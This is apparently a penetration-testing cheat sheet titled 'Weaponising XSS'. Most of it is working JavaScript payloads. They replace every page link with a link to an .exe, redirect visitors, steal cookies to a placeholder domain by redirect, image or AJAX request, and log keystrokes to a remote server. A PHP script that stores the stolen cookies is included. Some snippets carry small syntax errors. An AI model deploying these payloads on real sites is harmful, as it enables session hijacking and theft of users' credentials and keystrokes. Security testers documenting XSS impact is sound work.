---
description: 1-up your <script>alert(1)</script> and effectively demonstrate risk
---

# Weaponising XSS

## Content substitution

### Replace Link

Replace all links on the page with your link

```javascript
for (var i = 0; i < document.links.length; i++) {
  var a = document.links[i];
  a.href = 'https://domain.com/exploit.exe';
}
```

### Replace HTML element

Replace HTML elements wwith your custom content using Element.innerHTML function. Example below replaces entire body element.

```javascript
document.body.innerHTML = 'New body HTML';
```

### Forward traffic

Simply forward traffic to your own site

```javascript
location.replace("https://domain.com")
Example use in "input" field
onfocus=location.replace("https://domain.com") autofocus=a
```

## Data Exfiltration

### Cookie stealers

#### Simple cookie stealers

document.location cookie stealer

```javascript
<script type="text/javascript">
document.location='https://domain.com/cookiestealer.php?c='+document.cookie;
</script>
```

img src cookie stealer

```javascript
<script type="text/javascript">
<img src=x onerror=this.src='https://domain.com/?c='+document.cookie>
</script>
```

#### PHP Server to cache cookies

```php
<?php
header ('Location: https://redirect-domain.com');
    $cookies = $_GET["c"];
    $file = fopen('cookielog.txt, 'a');
    fwrite($file, $cookies . "\n\n\n");
?>
```

#### Javascript cookie stealer \(could be paired with keylogger below\)

Multiple methods have been included below for exfiltration, choose only one

```javascript
function ajaxRequest (method, url, data, ad) {
  var xmlHttp = new XMLHttpRequest()

  if (xmlHttp.overrideMimeType) {
    xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
  }

  xmlHttp.open(method, url, true)

  if (ad) {
    xmlHttp.onreadystatechange = function () {
      if (xmlHttp.readyState === 4) {
        ad(xmlHttp)
      }
    }
  }

  xmlHttp.send(data)
  return xmlHttp
}

var CookieExfil = function () {}
var c = document.cookie
//Include one of the three exfil methods below:
//GET request - AJAX
var i = new Image()
ajaxRequest('GET', 'https://domain.com?c=' + encodeURIComponent(c), undefined, CookieExfil)

//GET request DOM
var i = new Image()
i.src = 'https://domain.com?c=' + encodeURIComponent(c)
CookieExfil()

//POST request - AJAX
ajaxRequest('POST', 'https://domain.com', 'cookie=' + encodeURIComponent(c), CookieExfil)

```

### Key logger

Log keystrokes made to attackers remote server

```javascript
function ajaxRequest (method, url, data, ad) {
  var xmlHttp = new XMLHttpRequest()

  if (xmlHttp.overrideMimeType) {
    xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
  }

  xmlHttp.open(method, url, true)

  if (ad) {
    xmlHttp.onreadystatechange = function () {
      if (xmlHttp.readyState === 4) {
        ad(xmlHttp)
      }
    }
  }

  xmlHttp.send(data)
  return xmlHttp
}

document.addEventListener('keypress', function (e) {
  ajaxRequest('POST', 'https://domain.com/Log', 'key=' + e.key)
})
```

### 





